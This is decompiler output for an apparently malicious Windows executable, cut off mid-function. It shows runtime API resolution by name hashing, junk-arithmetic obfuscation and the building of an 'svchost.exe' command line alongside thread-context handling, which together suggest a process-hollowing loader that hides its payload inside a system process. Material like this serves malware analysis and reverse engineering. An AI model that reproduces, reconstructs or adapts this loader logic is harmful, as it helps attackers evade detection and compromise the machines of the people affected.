// subject_data.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw405000 = 0x0040406E; // 00405000
Eq_37 g_t405004 = // 00405004
	{
		&g_str404069
	};
uint32 g_dw405014 = 0x0040401C; // 00405014
Eq_37 g_t405018 = // 00405018
	{
		&g_str404017
	};
Eq_37 g_t40501C = // 0040501C
	{
		&g_str404012
	};
Eq_37 g_t405024 = // 00405024
	{
		&g_str404000
	};
word32 g_dw405040 = 0x00; // 00405040
union Eq_1277 * g_ptr405044 = null; // 00405044
union Eq_1277 * g_ptr40504C = null; // 0040504C
Eq_1072 g_t405054 = // 00405054
	{
		null
	};
Eq_1072 g_t405058 = // 00405058
	{
		null
	};
Eq_1072 g_t40505C = // 0040505C
	{
		&g_v0400
	};
Eq_1926 g_t405114 = &g_str404088; // 00405114
<anonymous> * g_a405118[] = // 00405118
	{
	};
uint32 g_dw405258 = 0x50; // 00405258
ui32 g_dw40525C = 0x00; // 0040525C
struct Eq_2307 * g_a405260[] = // 00405260
	{
	};
struct Eq_2169 * g_ptr405284 = null; // 00405284
struct Eq_2169 * g_ptr405288 = null; // 00405288
struct Eq_2131 * g_ptr40528C = null; // 0040528C
uint32 g_dw405290 = 0x08; // 00405290
uint32 g_dw405294 = 0x10; // 00405294
uint32 g_dw405298 = 0x20; // 00405298
uint32 g_dw40529C = 0x40; // 0040529C
uint32 g_dw4052A0 = 0x80; // 004052A0
uint32 g_dw4052A4 = 0x0100; // 004052A4
uint32 g_dw4052A8 = 0x0200; // 004052A8
int32 g_dw4052B0 = 0; // 004052B0
int32 g_dw4052B4 = 0; // 004052B4
word32 g_dw4052BC = 0x00; // 004052BC
word32 g_dw4052FC = 0x542C; // 004052FC
word32 g_dw405300 = 0x5440; // 00405300
word32 g_dw405304 = 0x544E; // 00405304
word32 g_dw405308 = 0x5460; // 00405308
word32 g_dw40530C = 21614; // 0040530C
word32 g_dw405310 = 21628; // 00405310
word32 g_dw405314 = 0x5488; // 00405314
word32 g_dw405318 = 0x5494; // 00405318
word32 g_dw40531C = 21666; // 0040531C
word32 g_dw405320 = 0x54AE; // 00405320
word32 g_dw405324 = 21692; // 00405324
word32 g_dw405328 = 0x54C4; // 00405328
word32 g_dw40532C = 0x54D4; // 0040532C
word32 g_dw405330 = 0x54EA; // 00405330
word32 g_dw405334 = 0x5524; // 00405334
word32 g_dw405338 = 0x5536; // 00405338
word32 g_dw40533C = 0x5542; // 0040533C
word32 g_dw405340 = 0x5550; // 00405340
word32 g_dw405344 = 0x555E; // 00405344
word32 g_dw405348 = 0x556A; // 00405348
word32 g_dw40534C = 0x5578; // 0040534C
word32 g_dw405350 = 0x5584; // 00405350
word32 g_dw405354 = 0x5590; // 00405354
word32 g_dw405358 = 0x55A0; // 00405358
word32 g_dw40535C = 0x55BA; // 0040535C
word32 g_dw405360 = 0x55C8; // 00405360
word32 g_dw405364 = 0x55D8; // 00405364
word32 g_dw405368 = 0x55EC; // 00405368
word32 g_dw40536C = 0x55FE; // 0040536C
word32 g_dw405370 = 22032; // 00405370
word32 g_dw405374 = 22056; // 00405374
word32 g_dw405378 = 22082; // 00405378
word32 g_dw40537C = 22110; // 0040537C
word32 g_dw405380 = 0x5676; // 00405380
word32 g_dw405384 = 0x5686; // 00405384
word32 g_dw40538C = 0x5504; // 0040538C
<anonymous> * __imp__GetModuleHandleA = &g_t542C; // 00405394
<anonymous> * __imp__FreeConsole = &g_t5440; // 00405398
<anonymous> * __imp__GetCommandLineA = &g_t544E; // 0040539C
<anonymous> * __imp__DeleteFileA = &g_t5460; // 004053A0
<anonymous> * __imp__ExitProcess = &g_t546E; // 004053A4
<anonymous> * __imp__lstrlenA = &g_t547C; // 004053A8
<anonymous> * __imp__lstrcatA = &g_t5488; // 004053AC
<anonymous> * __imp__CreateFileA = &g_t5494; // 004053B0
<anonymous> * __imp__WriteFile = &g_t54A2; // 004053B4
<anonymous> * __imp__CloseHandle = &g_t54AE; // 004053B8
<anonymous> * __imp__Sleep = &g_t54BC; // 004053BC
<anonymous> * __imp__LoadLibraryA = &g_t54C4; // 004053C0
<anonymous> * __imp__GetModuleFileNameA = &g_t54D4; // 004053C4
<anonymous> * __imp__lstrcpyA = &g_t54EA; // 004053C8
<anonymous> * __imp__GetStartupInfoA = &g_t5524; // 004053CC
<anonymous> * __imp__RtlUnwind = &g_t5536; // 004053D0
<anonymous> * __imp__HeapCreate = &g_t5542; // 004053D4
<anonymous> * __imp__HeapDestroy = &g_t5550; // 004053D8
<anonymous> * __imp__HeapAlloc = &g_t555E; // 004053DC
<anonymous> * __imp__HeapReAlloc = &g_t556A; // 004053E0
<anonymous> * __imp__HeapFree = &g_t5578; // 004053E4
<anonymous> * __imp__HeapSize = &g_t5584; // 004053E8
<anonymous> * __imp__HeapValidate = &g_t5590; // 004053EC
<anonymous> * __imp__GetSystemTimeAsFileTime = &g_t55A0; // 004053F0
<anonymous> * __imp__GetFileType = &g_t55BA; // 004053F4
<anonymous> * __imp__GetStdHandle = &g_t55C8; // 004053F8
<anonymous> * __imp__GetCurrentProcess = &g_t55D8; // 004053FC
<anonymous> * __imp__DuplicateHandle = &g_t55EC; // 00405400
<anonymous> * __imp__SetHandleCount = &g_t55FE; // 00405404
<anonymous> * __imp__GetEnvironmentStrings = &g_t5610; // 00405408
<anonymous> * __imp__FreeEnvironmentStringsA = &g_t5628; // 0040540C
<anonymous> * __imp__UnhandledExceptionFilter = &g_t5642; // 00405410
<anonymous> * __imp__SetConsoleCtrlHandler = &g_t565E; // 00405414
<anonymous> * __imp__VirtualAlloc = &g_t5676; // 00405418
<anonymous> * __imp__VirtualQuery = &g_t5686; // 0040541C
<anonymous> * __imp__StgCreateStorageEx = &g_t5504; // 00405424
Eq_1210 g_t405698 = null; // 00405698
struct _FILETIME g_t4056A0 = // 004056A0
	{
		0x00,
		0x00,
	};
struct Eq_2131 * g_ptr4056A8 = null; // 004056A8
uint32 g_dw4056AC = 0x00; // 004056AC
word32 g_dw4056B0 = 0x00; // 004056B0
word32 g_dw4056B4 = 0x00; // 004056B4
<anonymous> * g_ptr4056C0 = null; // 004056C0
<anonymous> * g_ptr4056C4 = null; // 004056C4
word32 g_dw4056C8 = 0x00; // 004056C8
word32 g_dw405780 = 0x00; // 00405780
<anonymous> * g_ptr405994 = null; // 00405994
<anonymous> * g_ptr405998 = null; // 00405998
<anonymous> * g_ptr40599C = null; // 0040599C
<anonymous> * g_ptr4059A0 = null; // 004059A0
<anonymous> * g_ptr4059A4 = null; // 004059A4
<anonymous> * g_ptr405DA8 = null; // 00405DA8
<anonymous> * g_ptr405DAC = null; // 00405DAC
<anonymous> * g_ptr405EB4 = null; // 00405EB4
<anonymous> * g_ptr405EB8 = null; // 00405EB8
<anonymous> * g_ptr405EBC = null; // 00405EBC
<anonymous> * g_ptr405EC0 = null; // 00405EC0
<anonymous> * g_ptr405EC4 = null; // 00405EC4
word32 g_dw405FCC = 0x00; // 00405FCC
word32 g_dw405FF8 = 0x00; // 00405FF8
word16 g_w405FFC = 0x00; // 00405FFC
union Eq_1277 * g_ptr406010 = null; // 00406010
Eq_1105 g_t406110 = // 00406110
	{
		0
	};
// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

CHAR g_str404000[] = "kernel32.dll"; // 00404000
CHAR g_str404012[] = "svch"; // 00404012
CHAR g_str404017[] = "exe "; // 00404017
CHAR g_str404069[] = "ost."; // 00404069
CHAR g_str404088[] = ""; // 00404088
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: void fn00401000()
// Called from:
//      fn00401AF5
void fn00401000()
{
	ptr32 fp;
	word32 dwLoc08;
	ui32 dwLoc0C;
	ui32 dwLoc10;
	ui32 eax_47 = 0x00 << (byte) dwLoc08 * 0x02 << (byte) dwLoc0C * 0x04 >> (byte) dwLoc10 * 0x02 + 0x18 >> (byte) dwLoc10 * 0x02 << (byte) dwLoc0C * 0x04 << (byte) dwLoc08 * 0x04;
	Eq_34 eax_51 = GetModuleHandleA(0x00);
	ui32 eax_67 = (eax_47 + 0x1873) *s (dwLoc10 * 0x02) ^ (eax_47 + 5125) *s (dwLoc0C * 0x02 + 0x0210) | eax_47 * 0x02 ^ eax_47 * 0x02 + 0xB3;
	int32 edx_73;
	for (edx_73 = 0x08; edx_73 >= 0x00; edx_73 -= 0x03)
	{
		ui32 ecx_77 = eax_47 * 0x02 + 101;
		ui32 dwLoc10_377 = ecx_77;
	}
	ui32 edx_112 = ecx_77 * 0x02 - ((ecx_77 * 0x02 + 0x10) *s (ecx_77 + 0x2222)) *s (eax_47 * 0x04 + 0x18EE) + eax_67 * 0x04;
	uint32 eax_115 = eax_47 * 0x02 << ((byte) eax_47 + 0x82) *s ((byte) eax_47 + 0x17) >> (byte) edx_112;
	word32 edx_86 = Mem78[eax_51 + 60:word32] + eax_51;
	struct Eq_109 * esp_133;
	word32 eax_134;
	g_ptr4056C0();
	uint32 dwLoc0C_380 = eax_115;
	int32 edx_139;
	for (edx_139 = 0x00; edx_139 <= 0x03; edx_139 += 0x03)
	{
		ui32 ecx_149 = eax_47 * 0x02 | dwLoc10_377 * 0x02;
		dwLoc10_377 = ecx_149;
	}
	int32 edx_155;
	for (edx_155 = 0x08; edx_155 >= 0x00; edx_155 -= 0x03)
		;
	esp_133->ptrFFFFFFFC = fp - 20;
	esp_133->dwFFFFFFF8 = edx_86->dw0050;
	esp_133->tFFFFFFF4 = eax_51;
	esp_133->dwFFFFFFF0 = eax_134;
	esp_133->dwFFFFFFEC = g_dw4056B0;
	struct Eq_154 * esp_189;
	g_ptr4056C4();
	g_dw4056C8 = 0x00010007;
	ui32 eax_214 = eax_115 << 0xA9 & eax_115 << 0x03 ^ (ecx_149 * 0x02) *s 0x9A;
	ui32 dwLoc10_393 = eax_214;
	int32 eax_217;
	for (eax_217 = 0x00; eax_217 <= 0x04; eax_217 += 0x02)
	{
		uint32 edx_228 = eax_214 + 0x260A ^ (eax_214 + dwLoc0C_380) * 0x02;
		dwLoc0C_380 = edx_228;
	}
	esp_189->dwFFFFFFFC = 0x004056C8;
	esp_189->dwFFFFFFF8 = g_dw4056B4;
	struct Eq_194 * esp_244;
	g_ptr405994();
	int32 eax_250;
	for (eax_250 = 0x00; eax_250 <= 0x08; eax_250 += 0x04)
	{
		ui32 edx_269 = edx_228 * 0x08 + 5299 & dwLoc10_393 * 0x02 + 9 << 0x00 & edx_228 * 0x02 + 10471 ^ edx_228 * 0x02 + 0x90;
		dwLoc10_393 = edx_269;
	}
	g_dw405780 = 4199554;
	int32 eax_277;
	for (eax_277 = 0x00; eax_277 <= 0x01; eax_277 += 0x05)
		;
	esp_244->dwFFFFFFFC = 0x004056C8;
	esp_244->dwFFFFFFF8 = g_dw4056B4;
	struct Eq_241 * esp_318;
	g_ptr405998();
	ui32 edx_334 = edx_269 * 0x02 + 0xF6;
	esp_318->dwFFFFFFFC = g_dw4056B4;
	ui32 edx_338 = 0x00 << (byte) edx_334;
	g_ptr40599C();
}

// 004012AC: Register word32 fn004012AC(Stack Eq_34 dwArg04, Stack uint32 dwArg08)
// Called from:
//      fn00401AF5
word32 fn004012AC(Eq_34 dwArg04, uint32 dwArg08)
{
	uint32 ebx_18 = dwArg08;
	word32 edx_22 = Mem17[dwArg04 + 60:word32] + dwArg04;
	int32 eax_25;
	for (eax_25 = 0x02; eax_25 >= 0x00; eax_25 -= 0x04)
		;
	struct Eq_274 * eax_58 = dwArg04 + edx_22->dw0078 / 4;
	word16 eax_62[] = dwArg04 + eax_58->dw0024 / 4;
	if (StgCreateStorageEx(null, 0x00, 0x00, 0x00, null, null, null, null) == 0x00)
		ebx_18 = dwArg08 - 318848;
	word32 eax_97[] = dwArg04 + eax_58->dw0020 / 4;
	word32 eax_101[] = dwArg04 + eax_58->dw001C / 4;
	int32 edx_103 = 0x00;
	while (true)
	{
		word32 eax_235;
		if (edx_103 >= eax_58->dw0018)
			break;
		int32 dwLoc30_293 = 0x00;
		do
		{
			int32 v24_143 = dwLoc30_293 + 0x03;
			dwLoc30_293 = v24_143;
		} while (v24_143 <= 0x07);
		int32 eax_151 = dwArg04 + eax_97[edx_103] / 4;
		byte dwLoc3C_306[] = null;
		uint32 dwLoc40_307 = 0x00;
		while (dwLoc3C_306[eax_151] != 0x00)
		{
			ui32 eax_171 = dwLoc40_307 << 0x07 | dwLoc40_307 >> 0x19;
			int32 eax_173;
			for (eax_173 = 0x00; eax_173 <= 0x09; eax_173 += 0x03)
				;
			dwLoc40_307 = (int32) dwLoc3C_306[eax_151] ^ 0x78 ^ eax_171;
			dwLoc3C_306 = (byte (*)[]) (dwLoc3C_306 + 1);
		}
		if (dwLoc40_307 == ebx_18)
		{
			int32 eax_209;
			for (eax_209 = 0x00; eax_209 <= 0x01; eax_209 += 0x05)
				;
			eax_235 = dwArg04 + eax_101[(word32) eax_62[edx_103]] / 4;
			return eax_235;
		}
		++edx_103;
	}
	eax_235 = 0x00;
	return eax_235;
}

// 00401AF5: Register word32 fn00401AF5(Register out Eq_383 edxOut)
// Called from:
//      Win32CrtStartup
word32 fn00401AF5(union Eq_383 & edxOut)
{
	ui32 dwLoc0C;
	ui32 dwLoc08;
	Eq_34 eax_21 = LoadLibraryA(g_t405024.u0);
	int32 eax_26;
	for (eax_26 = 0x01; eax_26 >= 0x00; eax_26 -= 0x02)
	{
		ui32 edx_41 = 0x00 << (((byte) dwLoc0C << 0x03) + 0x1D) + (byte) dwLoc0C * 0x02 | dwLoc08 + 9975;
	}
	g_ptr405EC4 = fn004012AC(eax_21, 0x76514B47);
	g_ptr4056C0 = fn004012AC(eax_21, 2866772262);
	g_ptr4056C4 = fn004012AC(eax_21, ~0x4D4770AA);
	ui32 eax_109 = (dwLoc0C << 0x02) + 0x12F3 + edx_41 * 0x02 >> (byte) edx_41 * 0x02 >> ((byte) dwLoc0C * 0x02 - ((byte) dwLoc0C << 0x02)) + ~0x02 | (-((dwLoc08 + 0x11D3) *s ((dwLoc08 + 0x190F) *s (dwLoc0C + 0x1C28))) + (dwLoc08 * 0x02) *s (edx_41 * 0x02 + 775)) * 0x02;
	int32 eax_128;
	for (eax_128 = 0x00; eax_128 <= 0x09; eax_128 += 0x05)
	{
		ui32 edx_149 = dwLoc0C << 0x03 & (dwLoc0C * 0x02 + 0xBE & eax_109 + 0x23EE >> (byte) (-(eax_109 << 0x03)) + 0xC0) | edx_41 * 0x02 + 0x1F57;
		dwLoc0C = edx_149;
	}
	g_ptr405994 = fn004012AC(eax_21, 2591936591);
	g_ptr405998 = fn004012AC(eax_21, ~0x658207B0);
	g_ptr40599C = fn004012AC(eax_21, 2355658424);
	g_ptr405EB4 = fn004012AC(eax_21, 2010992719);
	ui32 eax_180 = edx_149 * 0x02 + 252 << (byte) edx_41 + 0x8C ^ eax_109 + 8877;
	g_ptr4059A0 = fn004012AC(eax_21, 1061962149);
	GetModuleFileNameA(null, 0x00405EC8, 0x0104);
	ui32 eax_252 = eax_180 * 0x02 ^ eax_180 * 0x04 + 2909;
	ui32 eax_212 = edx_41 * 0x02 << (byte) eax_109 + 0x57 >> (byte) edx_41 * 0x08 + 131 ^ eax_180 * 0x02 + 0xB9;
	ui32 dwLoc0C_859 = eax_252;
	int32 eax_279;
	for (eax_279 = 0x00; eax_279 <= 0x06; eax_279 += 0x04)
	{
		Eq_571 dwLoc08_867 = eax_252 * 0x02 | eax_212 * 0x08 << (byte) eax_252 * 0x02 + ~0x44;
	}
	lstrcpyA(4218288, g_t40501C.u0);
	int32 eax_307;
	for (eax_307 = 0x07; eax_307 >= 0x00; eax_307 -= 0x03)
		dwLoc08_867 = eax_252 * 0x08 + 9040 >> (((byte) eax_252 + 121) + (byte) eax_252 * 0x02) - ((byte) dwLoc08_867 << 0x03);
	lstrcatA(4218288, g_t405004.u0);
	int32 eax_333;
	for (eax_333 = 0x05; eax_333 >= 0x00; --eax_333)
	{
		Eq_571 edx_348 = eax_252 << 0x03 << (byte) eax_252 * 0x02 & (eax_252 * 0x02 + 0x11B2) + dwLoc08_867 * 0x04 | eax_252 * 0x02 + 8158 | dwLoc08_867 * 0x02;
		dwLoc08_867 = edx_348;
	}
	lstrcatA(4218288, g_t405018.u0);
	int32 eax_365;
	for (eax_365 = 0x00; eax_365 <= 0x02; ++eax_365)
	{
		ui32 edx_375 = dwLoc0C_859 + 0x1FD1 + dwLoc0C_859 * 0x02 | edx_348 * 0x08 + 0x1008;
		dwLoc0C_859 = edx_375;
	}
	lstrcatA(4218288, 0x00405EC8);
	g_dw405FCC = 0x44;
	g_dw405FF8 = 0x01;
	ui32 ecx_392 = edx_348 * 0x02 + 0x1FE3 | edx_375 + 0x1EF0;
	g_w405FFC = 0x02;
	uint32 eax_407 = ecx_392 * 0x02 >> (((byte) edx_348 * 0x04) *s (byte) ecx_392) * 0x04 - (byte) edx_375 * 0x02;
	ui32 dwLoc08_887 = edx_375 * 0x02 | (eax_407 + 0x0AAE & 0x00 >> (byte) edx_375 * 0x02) & ((edx_375 * 0x02 + 0x8B) *s edx_348) * 0x02;
	int32 eax_429;
	for (eax_429 = 0x03; eax_429 >= 0x00; eax_429 -= 0x02)
	{
		ui32 edx_444 = dwLoc08_887 + 8282 ^ (dwLoc08_887 * 0x02 + 0xCE & eax_407 * 0x04) & dwLoc08_887 + 0x24D1 ^ dwLoc08_887 * 0x02 + 133;
		dwLoc08_887 = edx_444;
	}
	struct Eq_760 * esp_483;
	g_ptr405EC4();
	ui32 ecx_512 = edx_444 * 0x02 + 0x82 & eax_407 * 0x02 + 199 >> (byte) edx_444 * 0x02;
	esp_483->dwFFFFFFFC = g_dw405000;
	ui32 edx_513 = edx_375 + 0x1824 ^ edx_444 << 0x03 & eax_407 * 0x02 + 54 << ((byte) edx_375 << 0x03) | ecx_512;
	ui32 eax_514 = eax_407 * 0x02 | edx_513;
	struct Eq_799 * esp_522;
	Eq_34 eax_523;
	g_ptr4059A0();
	int32 eax_529;
	for (eax_529 = 0x06; eax_529 >= 0x00; --eax_529)
		;
	esp_522->dwFFFFFFFC = 2235260587;
	esp_522->tFFFFFFF8 = eax_523;
	g_ptr4059A4 = fn004012AC(esp_522->tFFFFFFF8, esp_522->dwFFFFFFFC);
	esp_522->dwFFFFFFFC = 4164549716;
	esp_522->tFFFFFFF8 = eax_523;
	g_ptr405DA8 = fn004012AC(esp_522->tFFFFFFF8, esp_522->dwFFFFFFFC);
	esp_522->dwFFFFFFFC = 2283638022;
	esp_522->tFFFFFFF8 = eax_523;
	g_ptr405DAC = fn004012AC(esp_522->tFFFFFFF8, esp_522->dwFFFFFFFC);
	esp_522->dwFFFFFFFC = 0x2A411902;
	esp_522->tFFFFFFF8 = eax_523;
	g_ptr405EB8 = fn004012AC(esp_522->tFFFFFFF8, esp_522->dwFFFFFFFC);
	esp_522->dwFFFFFFFC = 0x7F0CCB72;
	esp_522->tFFFFFFF8 = eax_523;
	g_ptr405EC0 = fn004012AC(esp_522->tFFFFFFF8, esp_522->dwFFFFFFFC);
	Eq_383 edi_622 = eax_514 * 0x02 - 0x3F << 0x00;
	ui32 edx_671 = -(((word32) edi_622.u0 + 4070) *s (edi_622 * 0x02)) + 223 ^ eax_514 * 0x04 + 1551 & ((0x00 >> (byte) eax_514 * 0x02) >> (byte) eax_514 + 0xC3) >> (eax_514 * 0x02 - 0x3F) * 0x02;
	esp_522->dwFFFFFFFC = g_dw405014;
	ui32 eax_702 = (edx_671 ^ 0x0231) + 0x2542 & edi_622 * 0x02 + 0x0FFB << ((byte) edx_671 ^ 0x31) * 0x02 & edi_622 * 0x04;
	struct Eq_953 * esp_711;
	Eq_34 eax_712;
	g_ptr4059A0();
	Eq_383 dwLoc0C_909 = edi_622;
	ui32 dwLoc10_912 = eax_702;
	int32 eax_720;
	for (eax_720 = 0x01; eax_720 >= 0x00; eax_720 -= 0x04)
	{
		ui32 edx_740 = dwLoc10_912 * 0x02 + 0x09C0 ^ (edx_671 ^ 0x0231) + 0x0577 | ((word32) edi_622.u0 + 5059 >> (byte) dwLoc10_912 * 0x02 + 227) << ((byte) edx_671 ^ 0x31) * 0x02 & dwLoc10_912 * 0x02;
		dwLoc10_912 = edx_740;
	}
	esp_711->dwFFFFFFFC = 0xA76B091A;
	esp_711->tFFFFFFF8 = eax_712;
	g_ptr405EBC = fn004012AC(esp_711->tFFFFFFF8, esp_711->dwFFFFFFFC);
	fn00401000();
	ui32 eax_766 = edx_740 + 0x039E ^ (edx_671 ^ 0x0231) + 0x1E9E;
	int32 eax_781;
	for (eax_781 = 0x02; eax_781 >= 0x00; eax_781 -= 0x03)
	{
		int32 dwLoc24_921 = dwLoc0C_909 * 0x02;
		Eq_383 edx_804 = (edx_671 ^ 0x0231) * 0x02 | eax_766 * 0x02 | ((((eax_766 + 5668) *s (eax_766 * 0x04 + 0x0CD1) + (edx_671 ^ 0x0231) * 0x08) - (eax_766 * 0x02 + 87) *s ((edx_671 ^ 0x0231) * 0x02 + 188)) - dwLoc24_921) + 8598 & dwLoc24_921;
		dwLoc0C_909 = edx_804;
	}
	edxOut = edx_804;
	return 0x00;
}

// 00402110: Register Eq_287 Win32CrtStartup()
Eq_287 Win32CrtStartup()
{
	ptr32 fp;
	struct Eq_1061 * fs;
	word32 ebx;
	word32 edx;
	Eq_1064 tLoc64;
	fs->ptr0000 = fp - 20;
	g_t405058.u0 = (LPCVOID) fn00402CE0();
	ptr32 esp_35 = fp - 0x70;
	if (fn004024D0() != 0x00)
	{
		fn004025D0(edx, ebx);
		fn00402640();
		fn00402690();
		fn00402A70();
		word32 edx_76 = fn00402B10();
		<anonymous> ** ebx_100 = (<anonymous> **) 0x004040E0;
		while (ebx_100 < (<anonymous> **) 0x004040E0)
		{
			(*ebx_100)();
			ebx_100 = (<anonymous> **) ((char *) ebx_100 + 4);
		}
		Eq_37 edx_123;
		tLoc64.dwFlags = (DWORD) 0x00;
		struct Eq_1121 * esp_104 = esp_35 - 4;
		esp_104->t0000.u0 = (LPCSTR) &tLoc64;
		GetStartupInfoA(esp_104->t0000.u1);
		esp_104->t0000.u0 = 0x00;
		Eq_34 eax_109 = GetModuleHandleA(esp_104->t0000);
		word32 eax_112 = fn00402BD0();
		if ((tLoc64.dwFlags & 0x01) != 0x00)
			edx_123.u0 = (word32) tLoc64.wShowWindow;
		else
			edx_123.u0 = 0x0A;
		esp_104->t0000.u0 = (LPCSTR) edx_123;
		esp_104->dwFFFFFFFC = eax_112;
		esp_104->dwFFFFFFF8 = 0x00;
		esp_104->tFFFFFFF4 = eax_109;
		word32 edx_141;
		Eq_1105 eax_137 = fn00401AF5(out edx_141);
		ptr32 esp_148 = (char *) &esp_104->t0000 + 4;
		<anonymous> ** esi_150 = (<anonymous> **) 0x004040E0;
		while (esi_150 < (<anonymous> **) 0x004040E0)
		{
			(*esi_150)();
			esi_150 = (<anonymous> **) ((char *) esi_150 + 4);
		}
		union Eq_1105 * esp_170 = esp_148 - 4;
		esp_170->u0 = (int32) eax_137;
		fn00402C10(esp_170->u0);
	}
	else
		fn004025C0(0x01);
}

// 004024D0: Register word32 fn004024D0()
// Called from:
//      Win32CrtStartup
word32 fn004024D0()
{
	Eq_1210 eax_10 = HeapCreate(0x01, 0x1000, 0x00);
	g_t405698 = eax_10;
	if (eax_10 == null)
		return 0x00;
	return 0x01;
}

// 00402520: Register Eq_1072 fn00402520(Stack Eq_1072 dwArg04)
// Called from:
//      fn004032B0
Eq_1072 fn00402520(Eq_1072 dwArg04)
{
	return HeapAlloc(g_t405698, 0x01, dwArg04);
}

// 00402560: void fn00402560(Stack Eq_1072 dwArg04)
// Called from:
//      fn00403610
void fn00402560(Eq_1072 dwArg04)
{
	HeapFree(g_t405698, 0x01, dwArg04);
}

// 004025C0: void fn004025C0(Stack Eq_1105 dwArg04)
// Called from:
//      Win32CrtStartup
//      fn00402690
//      fn00402A70
//      fn00402B10
//      fn00402C10
void fn004025C0(Eq_1105 dwArg04)
{
	ExitProcess(dwArg04);
}

// 004025D0: void fn004025D0(Register word32 edx, Register word32 ebx)
// Called from:
//      Win32CrtStartup
void fn004025D0(word32 edx, word32 ebx)
{
	Eq_1249 SCZDOP;
	if ((SCZDOP ^ 0x00200000 ^ SCZDOP) != 0x00)
		__cpuid(0x00, SCZDOP, &0x00, &ebx, &SCZDOP, &edx);
}

// 00402640: void fn00402640()
// Called from:
//      Win32CrtStartup
void fn00402640()
{
	GetSystemTimeAsFileTime(&g_t4056A0);
}

// 00402690: void fn00402690()
// Called from:
//      Win32CrtStartup
void fn00402690()
{
	Eq_1210 tLoc4C;
	Eq_1276 tLoc48;
	union Eq_1277 * eax_21 = fn004032B0(0x0100);
	union Eq_1277 * ebx_30 = eax_21;
	if (eax_21 != null)
	{
		g_ptr406010 = eax_21;
		g_t406110.u0 = 0x20;
		while (ebx_30 < (char *) g_ptr406010 + 0x0100)
		{
			ebx_30->u1.b0004 = 0x00;
			ebx_30->u0 = ~0x00;
			ebx_30->u1.b0005 = 0x0A;
			ebx_30 = (union Eq_1277 *) ((char *) ebx_30 + 8);
		}
		GetStartupInfoA(&tLoc48);
		if (tLoc48.cbReserved2 != 0x00 && tLoc48.lpReserved2 != null)
		{
			Eq_1331 eax_60 = tLoc48.lpReserved2;
			Eq_1105 esi_114 = eax_60.u0->u0;
			word32 dwLoc54_327 = eax_60 + 0x04;
			word32 dwLoc50_328 = esi_114 + (eax_60 + 0x04);
			if (esi_114 > 0x0800)
				esi_114.u0 = 0x0800;
			ui32 edi_109 = 0x01;
			while (g_t406110.u0 < esi_114)
			{
				union Eq_1277 * eax_78 = fn004032B0(0x0100);
				union Eq_1277 * ebx_101 = eax_78;
				if (eax_78 == null)
				{
					esi_114.u0 = g_t406110.u0;
					break;
				}
				*((char *) &g_ptr406010 + edi_109 * 0x04) = (union Eq_1277 **) eax_78;
				g_t406110.u0 = (int32) (g_t406110.u0 + 0x20);
				while (ebx_101 < (char *) (*((char *) (&g_ptr406010) + edi_109 * 0x04)) + 0x0100)
				{
					ebx_101->u1.b0004 = 0x00;
					ebx_101->u0 = ~0x00;
					ebx_101->u1.b0005 = 0x0A;
					ebx_101 = (union Eq_1277 *) ((char *) ebx_101 + 8);
				}
				++edi_109;
			}
			Eq_1105 edi_115 = 0x00;
			if (esi_114 > 0x00)
			{
				do
				{
					Eq_1210 eax_125 = *dwLoc50_328.u0;
					if (eax_125 != (void *) ~0x00)
					{
						ui32 edx_129 = (word32) *dwLoc54_327;
						if ((edx_129 & 0x01) != 0x00 && ((edx_129 & 0x08) != 0x00 || GetFileType(eax_125) != 0x00))
						{
							struct Eq_1501 * ebx_157 = (char *) *((char *) &g_ptr406010 + (edi_115 >> 0x05) * 0x04) + (edi_115 & 0x1F) * 0x08;
							ebx_157->dw0000 = *dwLoc50_328.u0;
							ebx_157->b0004 = *dwLoc54_327;
						}
					}
					edi_115 = (word32) edi_115.u0 + 1;
					++dwLoc54_327;
					dwLoc50_328 += 0x04;
				} while (edi_115 < esi_114);
			}
		}
		int32 edi_178;
		for (edi_178 = 0x00; edi_178 < 0x03; ++edi_178)
		{
			struct Eq_1373 * ebx_185 = &g_ptr406010->u0 + edi_178 * 0x08;
			if (ebx_185->t0000 == (void *) ~0x00)
			{
				Eq_287 eax_200;
				ebx_185->b0004 = 0x81;
				if (edi_178 == 0x00)
					eax_200 = ~0x09;
				else if (edi_178 == 0x01)
					eax_200 = ~0x0A;
				else
					eax_200 = ~0x0B;
				Eq_1210 eax_208 = GetStdHandle(eax_200);
				Eq_1210 esi_210 = eax_208;
				if (eax_208 != (void *) ~0x00)
				{
					Eq_287 eax_215 = GetFileType(eax_208);
					if (eax_215 == 0x00)
						goto l00402888;
					if (DuplicateHandle(GetCurrentProcess(), eax_208, GetCurrentProcess(), &tLoc4C, 0x00, 0x01, 0x02) != 0x00)
						esi_210 = tLoc4C;
					ebx_185->t0000 = esi_210;
					if ((eax_215 & 0xFF) == 0x02)
						ebx_185->b0004 |= 0x40;
					else if ((eax_215 & 0xFF) == 0x03)
						ebx_185->b0004 |= 0x08;
				}
				else
				{
l00402888:
					ebx_185->b0004 |= 0x40;
				}
			}
			else
				ebx_185->b0004 |= 0x80;
		}
		SetHandleCount(g_t406110.u0);
	}
	else
		fn004025C0(0x01);
}

// 004028E0: void fn004028E0(Stack Eq_536 dwArg04, Stack (ptr32 Eq_1277) dwArg08, Stack (ptr32 Eq_1571) dwArg0C, Stack (ptr32 word32) dwArg10, Stack (ptr32 word32) dwArg14)
// Called from:
//      fn00402A70
void fn004028E0(Eq_536 dwArg04, union Eq_1277 * dwArg08, struct Eq_1571 * dwArg0C, word32 * dwArg10, word32 * dwArg14)
{
	*dwArg14 = 0x00;
	*dwArg10 = 0x01;
	union Eq_1277 * edx_153 = dwArg08;
	struct Eq_1571 * ebx_109 = dwArg0C;
	Eq_536 edi_121 = dwArg04;
	if (dwArg08 != null)
	{
		dwArg08->u0 = dwArg0C;
		edx_153 = (union Eq_1277 *) &dwArg08->u1.b0004;
	}
	if (dwArg04.u0->t0000 == 0x22)
	{
		while (true)
		{
			&edi_121.u0->t0000 = edi_121.u0 + 1;
			if (edi_121.u0->t0000 == 0x22 || (edi_121.u0)->t0000 == 0x00)
				break;
			if (ebx_109 != null)
			{
				ebx_109->b0000 = edi_121.u0->t0000;
				++ebx_109;
			}
			++*dwArg14;
		}
		if (ebx_109 != null)
		{
			ebx_109->b0000 = 0x00;
			++ebx_109;
		}
		++*dwArg14;
		if (edi_121.u0->t0000 == 0x22)
			&edi_121.u0->t0000 = edi_121.u0 + 1;
	}
	else
	{
		do
		{
			if (ebx_109 != null)
			{
				ebx_109->b0000 = edi_121.u0->t0000;
